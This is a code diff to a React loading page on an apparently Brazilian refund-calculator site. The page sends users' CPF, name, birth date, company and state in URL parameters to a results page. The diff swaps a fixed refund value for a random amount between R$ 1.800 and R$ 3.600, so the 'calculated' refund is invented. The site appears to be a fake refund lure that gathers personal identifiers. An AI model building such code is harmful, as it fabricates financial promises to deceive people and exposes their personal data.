@@ -44,12 +44,14 @@ export default function CalculoLoading() {
         // Quando terminar as mensagens, redirecionar para o resultado
         clearInterval(timer);
         
-        // Criar valor de restituição base (R$ 74,90 em centavos)
-        const valorRestituicao = 7490;
+        // Gerar um valor aleatório entre 1.800,00 e 3.600,00 com centavos
+        const valorMinimo = 180000; // R$ 1.800,00 em centavos
+        const valorMaximo = 360000; // R$ 3.600,00 em centavos
+        const valorAleatorio = Math.floor(Math.random() * (valorMaximo - valorMinimo + 1)) + valorMinimo;
         
         // Redirecionar para o resultado com todos os dados necessários
         setTimeout(() => {
-          setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorRestituicao)}&valorMedio=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
+          setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
         }, 1000);
       }
     };
